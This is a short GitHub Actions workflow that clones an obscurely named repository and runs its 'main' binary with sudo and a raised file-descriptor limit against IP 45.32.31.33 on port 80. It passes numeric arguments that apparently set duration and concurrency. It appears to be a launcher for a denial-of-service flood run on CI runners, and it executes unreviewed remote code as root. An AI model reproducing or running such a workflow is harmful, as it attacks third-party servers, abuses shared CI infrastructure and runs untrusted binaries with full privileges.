name: Run test

on: [workflow_dispatch]

jobs:
  run-program:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout current repository
        uses: actions/checkout@v4

      - name: Clone repository
        run: git clone https://github.com/sdasdsaddd33/sdadsddasdytccp.git ./target-repo

      - name: Run git
        run: chmod +x ./target-repo/main

      - name: Run program
        run: |
          cd ./target-repo
          sudo prlimit --nofile=8000 ./main 45.32.31.33 80 15000 500